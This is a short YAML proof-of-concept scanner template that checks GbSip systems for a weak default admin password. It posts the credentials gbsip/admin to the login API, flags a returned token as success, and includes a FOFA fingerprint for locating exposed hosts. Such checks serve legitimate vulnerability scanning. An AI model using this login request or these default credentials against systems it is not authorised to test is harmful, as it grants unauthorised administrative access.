id: poc-yaml-gbsip-weak-password-login
info:
  name: GbSip 弱口令登录漏洞
  severity: medium
  tags:
  - 弱口令
  finger: gbsip
  fofa: fid="zCGOH12sYJMqbyQhFJvjNw=="
requests:
- method: POST
  path: /api/Admin/Login?UserName=gbsip&Password=admin
  headers:
    Content-Length: 0
  expression: status_code == 200 && contains(body,"\"data\":") && matches(body,"\"Token\":\"[a-z0-9A-Z]+\"")
    && !contains(body,"<") && contains(content_type,"application/json")
variables: {}
transport: http
